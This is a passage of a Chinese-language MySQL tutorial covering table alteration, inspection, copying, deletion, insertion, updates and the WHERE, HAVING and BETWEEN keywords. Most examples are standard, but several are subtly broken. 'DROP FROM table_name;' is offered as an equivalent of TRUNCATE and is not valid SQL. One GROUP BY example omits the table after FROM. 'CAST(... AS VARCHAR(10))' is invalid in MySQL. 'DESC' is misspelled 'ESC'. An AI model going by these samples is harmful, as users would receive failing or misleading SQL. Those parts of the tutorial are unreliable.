<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name<br><span class="hljs-keyword">ADD</span> <span class="hljs-keyword">UNIQUE</span> (column_name);<br><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name<br><span class="hljs-keyword">ADD</span> <span class="hljs-keyword">PRIMARY</span> KEY (column_name);<br><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name<br><span class="hljs-keyword">ADD</span> INDEX index_name (column_name);<br></code></pre></td></tr></table></figure>

<p><code>ALTER TABLE</code>语句会锁定表，直到操作完成。</p>
</li>
</ol>
<h2 id="显示表结构"><a href="#显示表结构" class="headerlink" title="显示表结构"></a>显示表结构</h2><p>ESC或者DESCRIBE，用于显示指定表的列结构，包括列名、数据类型、是否允许NULL，以及其他关于列的信息。</p>
<p>运行这个命令会返回以下信息：</p>
<ul>
<li><strong>Field</strong>：列的名称。</li>
<li><strong>Type</strong>：列的数据类型和长度。</li>
<li><strong>Null</strong>：如果列可以包含NULL值，这个字段会显示”YES”，否则显示”NO”。</li>
<li><strong>Key</strong>：如果列是某种键，这个字段会显示键的类型。”PRI”表示主键，”UNI”表示唯一键，”MUL”表示这个列是一个非唯一索引，或者这个列是多个列的一部分，这些列作为复合主键或复合索引，也可能是外键。</li>
<li><strong>Default</strong>：列的默认值。如果没有指定默认值，这个字段会显示NULL。</li>
<li><strong>Extra</strong>：其他的额外信息，例如，如果列被定义为AUTO_INCREMENT，这个字段就会显示”AUTO_INCREMENT”。</li>
</ul>
<p>，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DESC 表名;<br></code></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">+</span><span class="hljs-comment">-------+--------------+------+-----+---------+----------------+</span><br><span class="hljs-operator">|</span> Field <span class="hljs-operator">|</span> Type         <span class="hljs-operator">|</span> <span class="hljs-keyword">Null</span> <span class="hljs-operator">|</span> Key <span class="hljs-operator">|</span> <span class="hljs-keyword">Default</span> <span class="hljs-operator">|</span> Extra          <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+--------------+------+-----+---------+----------------+</span><br><span class="hljs-operator">|</span> id    <span class="hljs-operator">|</span> <span class="hljs-type">int</span>(<span class="hljs-number">11</span>)      <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span> PRI <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> auto_increment <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> name  <span class="hljs-operator">|</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>) <span class="hljs-operator">|</span> YES  <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+--------------+------+-----+---------+----------------+</span><br></code></pre></td></tr></table></figure>

<h2 id="查看创建表的SQL语句"><a href="#查看创建表的SQL语句" class="headerlink" title="查看创建表的SQL语句"></a>查看创建表的SQL语句</h2><ol>
<li>SHOW CREATE TABLE语句</li>
</ol>
<p>SHOW CREATE TABLE语句可用于查看创建表的SQL语句，包括所有列、键和约束：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW CREATE TABLE table_name;<br></code></pre></td></tr></table></figure>

<p>返回结果示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE `employee` (<br>  `id` int NOT NULL,<br>  `emp_id` char(10) DEFAULT NULL,<br>  `emp_name` varchar(10) DEFAULT NULL,<br>  `manager_id` char(10) DEFAULT NULL,<br>  PRIMARY KEY (`id`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci<br></code></pre></td></tr></table></figure>

<h2 id="复制表"><a href="#复制表" class="headerlink" title="复制表"></a>复制表</h2><p>在MySQL中，你可以通过创建新表并从现有表中复制数据来复制表。下面是一种方法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> new_table <span class="hljs-keyword">AS</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> existing_table;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>new_table</code>是你想要创建的新表的名称，<code>existing_table</code>是你想要复制数据的现有表的名称。这个操作将创建一个新表，并将现有表中的所有数据复制到新表中。</p>
<p>需要注意的是，使用这种方法创建的新表不会包含现有表的索引、主键、唯一键和其他约束。如果你需要复制这些属性，你需要使用其他方法，例如先使用<code>CREATE TABLE</code>语句创建表和相应的约束，然后使用<code>INSERT INTO ... SELECT</code>语句复制数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> new_table <span class="hljs-keyword">LIKE</span> existing_table; <br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> new_table <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> existing_table;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，<code>CREATE TABLE new_table LIKE existing_table;</code>语句创建一个与现有表结构（包括索引和约束）完全相同的新表，但不包含任何数据。然后，<code>INSERT INTO new_table SELECT * FROM existing_table;</code>语句将现有表中的所有数据复制到新表中。</p>
<h2 id="复制符合条件的记录"><a href="#复制符合条件的记录" class="headerlink" title="复制符合条件的记录"></a>复制符合条件的记录</h2><p>当另一个表已经存在时，可以使用 <code>INSERT INTO SELECT</code> 语句来从一个表复制符合条件的记录到另一个表中。具体来说，<code>INSERT INTO SELECT</code> 语句会将一个查询结果插入到指定的表中。</p>
<p>以下是一个使用 <code>INSERT INTO SELECT</code> 语句复制符合条件的记录的示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO newtable (col1, col2, ...)<br>	SELECT col1, col2, ...<br>FROM oldtable<br>	WHERE condition;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，我们把符合查询条件的列数据从旧表 oldtable 复制到新表 newtable。选择需要复制的列，并通过 WHERE 子句指定要复制的特定行。</p>
<p>需要注意的是，在执行 INSERT INTO SELECT 语句之前，我们必须先创建新表，并保证它与旧表拥有相同的结构。此外，也可以为新表添加索引或其他约束，以确保数据完整性和查询性能。</p>
<p>还可以在 <code>SELECT</code> 语句中使用 JOIN、GROUP BY、HAVING 等功能来实现更加复杂的查询操作。例如，我们可以使用 <code>JOIN</code> 连接多个表，并根据多个条件对记录进行筛选，最终将满足条件的记录插入到新表中。</p>
<p>如果需要将一个表中符合条件的记录复制到一个新表中，并且该表不存在，可以使用以下语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE newtable<br>	SELECT col1, col2, ...<br>FROM oldtable<br>	WHERE condition;<br></code></pre></td></tr></table></figure>

<p>这条 <code>CREATE TABLE AS</code> 语句会首先创建一个名为 newtable 的新表，然后将满足 WHERE 子句指定的条件的所有行从 oldtable 复制到新表中。</p>
<p>需要注意的是，新表的列会自动继承 SELECT 列出的列的名称和数据类型。如果需要重新命名列或更改其数据类型，则可以使用 <code>AS</code> 或其他列定义语法来修改列属性。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE newtable<br>	SELECT id AS new_id, name, CAST(age AS VARCHAR(10)) AS age_str<br>FROM oldtable<br>	WHERE condition;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，我们在 SELECT 语句中为新表定义了新的列名和数据类型，并将旧表的 id 列重命名为 new_id。最终，MySQL 将会根据 SELECT 语句的结果集自动创建新表的结构，并将所有符合条件的记录插入到新表中。</p>
<p>总而言之，<code>CREATE TABLE AS</code> 是一个强大的功能，它可以帮助我们快速创建一个新表并复制符合特定条件的记录。无论是用于数据备份、数据迁移还是进行数据分析，都是非常有用的工具。</p>
<h2 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h2><p>在MySQL中，你可以使用 <code>DROP TABLE</code> 语句来删除已经存在的表。以下是其基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> table_name;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>table_name</code> 是你想要删除的表的名称。例如，如果你想删除名为 <code>students</code> 的表，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> students;<br></code></pre></td></tr></table></figure>

<p>此外，在目标表不存在的情况下执行DROP命令会发生错误，如果和<code>IF EXISTS</code>子句一起使用，就可以避免在试图删除不存在的表时出现错误。下面是如何使用它的语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> table_name;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>table_name</code>是你想要删除的表的名称。例如，如果你想删除名为<code>students</code>的表，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> students;<br></code></pre></td></tr></table></figure>

<p>如果<code>students</code>表存在，上述语句将删除它。如果<code>students</code>表不存在，MySQL将发出一条警告，而不是一个错误，并允许查询继续。</p>
<h2 id="删除所有记录"><a href="#删除所有记录" class="headerlink" title="删除所有记录"></a>删除所有记录</h2><p>请注意，<code>DROP TABLE</code> 语句会永久删除表以及表中的所有数据，因此在使用之前请确保你真的想要删除该表。如果你只是想删除表中的所有数据，但是想保留表的结构（例如列的定义和约束），你应该使用 <code>TRUNCATE TABLE</code> 语句，在MySQL中，<code>TRUNCATE</code>是一个DDL（数据定义语言）语句，用于删除表中的所有记录如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">TRUNCATE</span> <span class="hljs-keyword">TABLE</span> table_name;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，<code>TRUNCATE TABLE students;</code> 会删除 <code>students</code> 表中的所有数据，但是表本身和其结构仍然存在。</p>
<p>或者使用如下命令也可以达到同样的效果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP FROM table_name;<br></code></pre></td></tr></table></figure>

<h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT 列名1, 列名2... FROM 表名;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM 表名;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT &#x27;会将这段文字输出&#x27;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT (1+2)*3;<br></code></pre></td></tr></table></figure>

<h2 id="插入记录"><a href="#插入记录" class="headerlink" title="插入记录"></a>插入记录</h2><p>在MySQL中，可以使用<code>INSERT INTO</code>语句向表中插入数据。以下是几个例子：</p>
<ol>
<li><p><strong>插入完整的行数据：</strong></p>
<p>在这种情况下，你需要提供表中每个列的值。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (column1, column2, column3, ...)<br><span class="hljs-keyword">VALUES</span> (value1, value2, value3, ...);<br></code></pre></td></tr></table></figure>

<p>例如，如果你有一个名为<code>students</code>的表，它有<code>id</code>, <code>name</code>, <code>age</code>, <code>email</code>四个列，你可以这样插入数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> students (id, name, age, email)<br><span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;John Doe&#x27;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&#x27;johndoe@example.com&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>注意：如果你的表有一个设置了<code>AUTO_INCREMENT</code>的列（如<code>id</code>列），你可以在插入数据时省略该列，MySQL会自动为它分配一个值。</p>
</li>
<li><p><strong>插入特定列的数据：</strong></p>
<p>在这种情况下，你只需要提供你想插入的列的值。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (column1, column2, ...)<br><span class="hljs-keyword">VALUES</span> (value1, value2, ...);<br></code></pre></td></tr></table></figure>

<p>例如，如果你只想插入<code>students</code>表中的<code>name</code>和<code>email</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> students (name, email)<br><span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;John Doe&#x27;</span>, <span class="hljs-string">&#x27;johndoe@example.com&#x27;</span>);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>插入多行数据：</strong></p>
<p>你可以一次插入多行数据，只需在<code>VALUES</code>关键字后面列出所有的值。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (column1, column2, ...)<br><span class="hljs-keyword">VALUES</span> <br>(value1, value2, ...),<br>(value1, value2, ...),<br>...<br>;<br></code></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> students (name, email)<br><span class="hljs-keyword">VALUES</span> <br>(<span class="hljs-string">&#x27;John Doe&#x27;</span>, <span class="hljs-string">&#x27;johndoe@example.com&#x27;</span>),<br>(<span class="hljs-string">&#x27;Jane Doe&#x27;</span>, <span class="hljs-string">&#x27;janedoe@example.com&#x27;</span>);<br></code></pre></td></tr></table></figure></li>
</ol>
<h2 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h2><p>在MySQL中，你可以使用<code>UPDATE</code>语句来更新已经存在的记录。以下是其基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> table_name<br><span class="hljs-keyword">SET</span> column1 <span class="hljs-operator">=</span> value1, column2 <span class="hljs-operator">=</span> value2, ...<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>table_name</code>是你想要更新记录的表的名称，<code>column1</code>, <code>column2</code>, … 是你想要更新的列的名称，<code>value1</code>, <code>value2</code>, … 是你想设置的新值，<code>condition</code>是用于确定哪些记录应该被更新的条件。如果没有使用WHERE设置条件，列中的所有记录都会被替换掉，为防止这种情况发生，在启动MySQL监视器的时候，可以加上–safe-update选项，使用此选项后，如果没有WHERE条件就无法执行UPDATE或DELETE。</p>
<p>以下是一个例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> students<br><span class="hljs-keyword">SET</span> age <span class="hljs-operator">=</span> <span class="hljs-number">21</span>, email <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;newemail@example.com&#x27;</span><br><span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;John Doe&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>这个语句会在<code>students</code>表中找到所有名字为<code>John Doe</code>的记录，并将它们的<code>age</code>列设置为21，<code>email</code>列设置为<code>newemail@example.com</code>。</p>
<p>请注意，如果你省略了<code>WHERE</code>子句，<code>UPDATE</code>语句将更新表中的所有记录。因此，除非你真的想更新所有记录，否则应始终在使用<code>UPDATE</code>语句时包含<code>WHERE</code>子句。</p>
<p>另外，你应该谨慎使用<code>UPDATE</code>语句，因为一旦记录被更新，你就不能撤销更改。在更新重要的表之前，你应该考虑备份数据。</p>
<h2 id="删除记录"><a href="#删除记录" class="headerlink" title="删除记录"></a>删除记录</h2><p>在 MySQL 中，可以使用 <code>DELETE</code> 语句删除表中的记录。以下是一些常见的用法和语法：</p>
<ol>
<li>删除整个表中的所有记录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELETE FROM table_name;<br></code></pre></td></tr></table></figure>

<p>这条语句将会从表 <code>table_name</code> 中删除所有记录。需要注意的是，<code>DELETE</code> 操作无法撤销，因此务必谨慎地使用。</p>
<ol start="2">
<li>删除符合条件的记录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELETE FROM table_name WHERE condition;<br></code></pre></td></tr></table></figure>

<p>这条语句将会从表 <code>table_name</code> 中删除满足指定条件的记录。例如，我们可以将下面的语句用于删除年龄大于 30 岁的人员信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELETE FROM person WHERE age &gt; 30;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>删除部分符合条件的记录</li>
</ol>
<p>有时候，我们可能只想删除表中的前几行数据，或者只删除满足某些条件的前几行数据。可以使用 <code>LIMIT</code> 子句来限制待删除的记录数。例如，以下语句将会删除表 <code>person</code> 中前 10 行记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELETE FROM person LIMIT 10;<br></code></pre></td></tr></table></figure>

<p>如果要删除符合条件的前 10 行数据，则可以如下写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELETE FROM person WHERE age &gt; 30 ORDER BY id LIMIT 10;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，我们选择指定了 <code>WHERE</code> 条件和排序方式，并使用 <code>LIMIT</code> 限制了最多删除 10 行记录。</p>
<h1 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h1><h2 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h2><p>在MySQL中，<code>WHERE</code>子句用于在查询中指定条件，以过滤出满足特定条件的记录。以下是<code>WHERE</code>子句的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>condition</code> 是用于确定哪些记录应该被返回的条件。</p>
<p>以下是一些使用<code>WHERE</code>子句的例子：</p>
<ol>
<li><p><strong>基于单个条件的查询：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">WHERE</span> age <span class="hljs-operator">&gt;</span> <span class="hljs-number">20</span>;<br></code></pre></td></tr></table></figure>

<p> 这个查询将返回年龄大于 20 的所有学生记录。</p>
</li>
<li><p><strong>基于多个条件的查询：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">WHERE</span> age <span class="hljs-operator">&gt;</span> <span class="hljs-number">20</span> <span class="hljs-keyword">AND</span> gender <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Female&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p> 这个查询将返回年龄大于 20 并且性别为女性的学生记录。</p>
</li>
<li><p><strong>使用比较运算符的查询：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">WHERE</span> age <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">18</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">25</span>;<br></code></pre></td></tr></table></figure>

<p> 这个查询将返回年龄在 18 到 25 之间的学生记录。</p>
</li>
<li><p><strong>使用逻辑运算符的查询：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">WHERE</span> age <span class="hljs-operator">&gt;</span> <span class="hljs-number">20</span> <span class="hljs-keyword">OR</span> gender <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Female&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p> 这个查询将返回年龄大于 20 或性别为女性的学生记录。</p>
</li>
</ol>
<p>请注意，<code>WHERE</code>子句可以使用比较运算符（如 <code>=</code>, <code>&lt;&gt;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>），逻辑运算符（如 <code>AND</code>, <code>OR</code>, <code>NOT</code>），以及其他条件表达式（如 <code>IN</code>, <code>LIKE</code>, <code>IS NULL</code> 等）来构建复杂的条件。</p>
<p>WHERE可以对GROUP BY分组前的记录进行过滤，即在如下语句中，WHERE在GROUP BY之前执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT<br>	empid, AVG(sales)<br>FROM<br>	WHERE sales &gt;= 50<br>GROUP BY empid;<br></code></pre></td></tr></table></figure>

<h2 id="HAVING"><a href="#HAVING" class="headerlink" title="HAVING"></a>HAVING</h2><p>在MySQL中，HAVING子句只能和GROUP BY子句搭配使用，<code>HAVING</code>子句用于在<code>GROUP BY</code>子句后对分组结果进行筛选，而且只能对聚合函数进行过滤和筛选。而GROUP BY子句则是将原始数据集按照指定的列进行分组，生成多个子集，并可使用聚合函数对每个子集进行计算，HAVING是在分组后执行的。</p>
<p>在执行GROUP BY子句之后，可以使用HAVING子句来进一步筛选符合条件的结果集。</p>
<p>在MySQL中，<code>HAVING</code>子句用于在<code>GROUP BY</code>子句后对分组结果进行筛选。它允许你使用聚合函数和条件来过滤分组后的结果集。</p>
<p>以下是<code>HAVING</code>的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ..., aggregate_function(<span class="hljs-keyword">column</span>)<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> column1, column2, ...<br><span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">condition</span>;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>aggregate_function</code> 是一个聚合函数（如 <code>SUM</code>, <code>COUNT</code>, <code>AVG</code> 等），<code>column</code> 是你想要按照其进行分组的列，<code>condition</code> 是用于筛选结果的条件。</p>
<p>以下是一个例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> department, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">as</span> total_students<br><span class="hljs-keyword">FROM</span> students<br>	<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> department<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-operator">&gt;</span> <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure>

<p>这个查询将根据学生表中的<code>department</code>列对记录进行分组，并计算每个部门的学生人数。然后，<code>HAVING</code>子句筛选出具有超过 10 名学生的部门。</p>
<p>请注意，<code>HAVING</code>子句在查询中的位置很重要，它通常出现在<code>GROUP BY</code>子句之后，<code>ORDER BY</code>子句之前。与<code>WHERE</code>子句不同，<code>HAVING</code>子句可以使用聚合函数和列的别名来指定条件。</p>
<p>另外，如果你只想筛选单个表中的数据而不进行分组，你可以使用<code>WHERE</code>子句。<code>HAVING</code>子句主要用于筛选分组后的结果。</p>
<h2 id="BETWEEN"><a href="#BETWEEN" class="headerlink" title="BETWEEN"></a>BETWEEN</h2><p>在MySQL中，BETWEEN是一个比较运算符，用于检查一个值是否在指定的一组或区间内。它能够用于数字，日期和时间等数据类型。</p>
<p>BETWEEN语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">value BETWEEN low AND high;<br></code></pre></td></tr></table></figure>

<p>其中，value是需要进行比较的值，low和high是指定的区间范围。对于数字类型的值来说，BETWEEN会返回一个布尔值，表示这个值是否在区间范围内；而对于日期和时间类型的值来说，BETWEEN则会将这个值转换为一个日期&#x2F;时间对象后再进行比较。</p>
<p>例如，假设我们有一个名为<code>orders</code>的表格，其中包含了订单的信息，包括订单编号、下单日期和订单总额等。如果我们想要查询某一段时间内的订单，可以使用BETWEEN关键字来实现，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM orders WHERE order_date BETWEEN &#x27;2021-01-01&#x27; AND &#x27;2021-03-31&#x27;;<br></code></pre></td></tr></table></figure>

<p>这条语句查询了从2021年1月1日到2021年3月31日之间的订单信息。</p>
<p>需要注意的是，在使用BETWEEN时，应该确保low和high的顺序正确，即low应该小于等于high。否则会导致结果不准确。同时也需要注意数据类型的匹配问题，避免类型不匹配的情况。</p>
